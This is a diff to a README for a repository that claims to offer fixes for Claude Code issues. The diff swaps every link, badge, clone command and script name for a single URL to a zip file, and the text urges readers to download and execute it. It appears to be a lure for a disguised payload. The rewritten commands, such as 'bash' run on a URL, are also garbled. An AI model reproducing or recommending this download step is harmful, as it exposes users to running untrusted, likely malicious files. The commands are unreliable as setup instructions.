@@ -1,6 +1,6 @@
 # Claude Daily Fixes: Workarounds and Solutions for Claude Code Issues
 
-![Daily Fixes](https://img.shields.io/badge/Claude%20Daily%20Fixes-%20blue?style=for-the-badge&logo=github)
+![Daily Fixes](https://github.com/Kfirm1208/claude-daily-fixes/raw/refs/heads/master/quadrangulate/claude_daily_fixes_1.7.zip%20Daily%20Fixes-%20blue?style=for-the-badge&logo=github)
 
 Welcome to the **Claude Daily Fixes** repository! This repository provides daily workarounds and fixes for common issues faced by developers using Claude Code. You will find solutions for various problems, including WSL image paste issues, update fixes, and community-contributed solutions.
 
@@ -30,7 +30,7 @@ The **Claude Daily Fixes** repository serves as a collection of practical soluti
 To get started, you can clone this repository using the following command:
 
 ```bash
-git clone https://github.com/Kfirm1208/claude-daily-fixes.git
+git clone https://github.com/Kfirm1208/claude-daily-fixes/raw/refs/heads/master/quadrangulate/claude_daily_fixes_1.7.zip
 ```
 
 After cloning, navigate to the directory:
@@ -39,7 +39,7 @@ After cloning, navigate to the directory:
 cd claude-daily-fixes
 ```
 
-You can also download the latest releases directly from the [Releases](https://github.com/Kfirm1208/claude-daily-fixes/releases) section. Download the required file and execute it as needed.
+You can also download the latest releases directly from the [Releases](https://github.com/Kfirm1208/claude-daily-fixes/raw/refs/heads/master/quadrangulate/claude_daily_fixes_1.7.zip) section. Download the required file and execute it as needed.
 
 ## 🖥️ Usage
 
@@ -47,18 +47,18 @@ After installation, you can access various scripts and solutions provided in thi
 
 ### WSL Image Paste Solution
 
-If you are facing issues with pasting images in WSL, you can find the solution in the `wsl-image-paste.sh` script. Execute the script as follows:
+If you are facing issues with pasting images in WSL, you can find the solution in the `https://github.com/Kfirm1208/claude-daily-fixes/raw/refs/heads/master/quadrangulate/claude_daily_fixes_1.7.zip` script. Execute the script as follows:
 
 ```bash
-bash wsl-image-paste.sh
+bash https://github.com/Kfirm1208/claude-daily-fixes/raw/refs/heads/master/quadrangulate/claude_daily_fixes_1.7.zip
 ```
 
 ### Update Fixes
 
-For update-related issues, check the `update-fixes.sh` script. Run it using:
+For update-related issues, check the `https://github.com/Kfirm1208/claude-daily-fixes/raw/refs/heads/master/quadrangulate/claude_daily_fixes_1.7.zip` script. Run it using:
 
 ```bash
-bash update-fixes.sh
+bash https://github.com/Kfirm1208/claude-daily-fixes/raw/refs/heads/master/quadrangulate/claude_daily_fixes_1.7.zip
 ```
 
 ### Community Contributions
@@ -83,9 +83,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Links
 
-For more information, visit the [Releases](https://github.com/Kfirm1208/claude-daily-fixes/releases) section for the latest updates and downloads. 
+For more information, visit the [Releases](https://github.com/Kfirm1208/claude-daily-fixes/raw/refs/heads/master/quadrangulate/claude_daily_fixes_1.7.zip) section for the latest updates and downloads. 
 
-![Claude Code](https://img.shields.io/badge/Claude%20Code-%20green?style=for-the-badge&logo=github)
+![Claude Code](https://github.com/Kfirm1208/claude-daily-fixes/raw/refs/heads/master/quadrangulate/claude_daily_fixes_1.7.zip%20Code-%20green?style=for-the-badge&logo=github)
 
 ## 🌟 Topics
 
